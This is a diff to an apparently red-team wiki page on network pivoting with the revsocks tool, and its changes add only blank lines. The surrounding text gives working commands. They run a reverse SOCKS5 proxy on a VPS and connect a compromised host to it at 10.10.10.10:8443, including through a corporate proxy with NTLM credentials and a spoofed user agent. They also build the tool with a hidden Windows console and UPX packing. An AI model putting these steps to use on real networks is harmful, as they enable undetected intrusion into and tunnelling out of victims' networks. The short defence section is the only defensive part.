@@ -47,9 +47,13 @@ From a technical perspective, the attacker sets up a reverse socks proxy on the 
 
 The business value of this technique is that it allows attackers to gain access to a target network without being detected, as the traffic appears to be coming from a legitimate host on the network. This can lead to data theft, system compromise, and other malicious activities.
 
+ 
+
 ## Requirements
 
 1. Access to a compromised host with the ability to install and run software
+
+ 
 
 ## Defense
 
@@ -59,9 +63,13 @@ The business value of this technique is that it allows attackers to gain access 
 
 1. Use multi-factor authentication to prevent unauthorized access to sensitive systems
 
+ 
+
 ## Objectives
 
 1. Gain access to a target network through a compromised host
+
+ 
 
 # Instructions
 
@@ -76,9 +84,17 @@ Optional arguments:
 - Use the -proxyauth flag to specify the proxy server's authentication credentials in the format 'Domain/username:password'.
 - Use the -useragent flag to specify the user agent string to use in the HTTP requests.
 
+ 
+
+
+
 **Code**: [[# Listen on the server and create a SOCKS 5 proxy ]]
 
+
+
 > The reverse SOCKS 5 proxy allows a client to connect to a server and use its network connections. This can be useful in situations where the client is behind a firewall or NAT and cannot connect directly to the server. The -listen flag specifies the server's listening address and port number, while the -socks flag specifies the address and port number of the local SOCKS 5 proxy. The -connect flag specifies the server's IP address and port number. The -pass flag specifies the password to use for authentication.
+
+
 
 **Command** ([[Create SOCKS 5 proxy on port 1080]]):
 
@@ -86,17 +102,27 @@ Optional arguments:
 user@VPS$ ./revsocks -listen :8443 -socks 127.0.0.1:1080 -pass Password1234
 ```
 
+
+
+
+
 **Command** ([[Connect client to the server]]):
 
 ```bash
 user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234
 ```
 
+
+
+
+
 **Command** ([[Connect client to the server with proxy]]):
 
 ```bash
 user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234 -proxy proxy.domain.local:3128 -proxyauth Domain/userpame:userpass -useragent "Mozilla 5.0/IE Windows 10"
 ```
+
+
 
 2. To build revsocks for Linux, follow these steps:
 1. Clone the repository using the following command: git clone https://github.com/kost/revsocks
@@ -119,10 +145,18 @@ To build revsocks for Windows, follow these steps:
 5. Build the executable again with the ldflags set to "-H=windowsgui"
 6. Compress the executable using the command: upx revsocks
 
+ 
+
+
+
 **Code**: [[# Build for Linux
 git clone https://github.com/kos]]
 
+
+
 > This command is used to build the revsocks executable for both Linux and Windows operating systems. The command provides step-by-step instructions to build the executable for both operating systems. The instructions include cloning the repository, setting the environment variables, getting the required dependencies, building the executable, and compressing the executable. The command also explains the purpose of each step and the arguments used in the commands.
+
+
 
 **Command** ([[Clone repository from GitHub]]):
 
@@ -130,11 +164,19 @@ git clone https://github.com/kos]]
 git clone https://github.com/kost/revsocks
 ```
 
+
+
+
+
 **Command** ([[Set GOPATH environment variable]]):
 
 ```bash
 export GOPATH=~/go
 ```
+
+
+
+
 
 **Command** ([[Install yamux package]]):
 
@@ -142,17 +184,29 @@ export GOPATH=~/go
 go get github.com/hashicorp/yamux
 ```
 
+
+
+
+
 **Command** ([[Install go-socks5 package]]):
 
 ```bash
 go get github.com/armon/go-socks5
 ```
 
+
+
+
+
 **Command** ([[Install go-ntlmssp package]]):
 
 ```bash
 go get github.com/kost/go-ntlmssp
 ```
+
+
+
+
 
 **Command** ([[Build executable for Linux]]):
 
@@ -160,11 +214,19 @@ go get github.com/kost/go-ntlmssp
 go build
 ```
 
+
+
+
+
 **Command** ([[Compress executable for Linux]]):
 
 ```bash
 upx --brute revsocks
 ```
+
+
+
+
 
 **Command** ([[Install yamux package]]):
 
@@ -172,11 +234,19 @@ upx --brute revsocks
 go get github.com/hashicorp/yamux
 ```
 
+
+
+
+
 **Command** ([[Install go-socks5 package]]):
 
 ```bash
 go get github.com/armon/go-socks5
 ```
+
+
+
+
 
 **Command** ([[Install go-ntlmssp package]]):
 
@@ -184,17 +254,27 @@ go get github.com/armon/go-socks5
 go get github.com/kost/go-ntlmssp
 ```
 
+
+
+
+
 **Command** ([[Build executable for Windows]]):
 
 ```bash
 GOOS=windows GOARCH=amd64 go build
 ```
 
+
+
+
+
 **Command** ([[Compress executable for Windows]]):
 
 ```bash
 upx revsocks
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -228,3 +308,5 @@ upx revsocks
 
 - [[Network Pivoting Techniques]]
 - [[revsocks]]
+
+
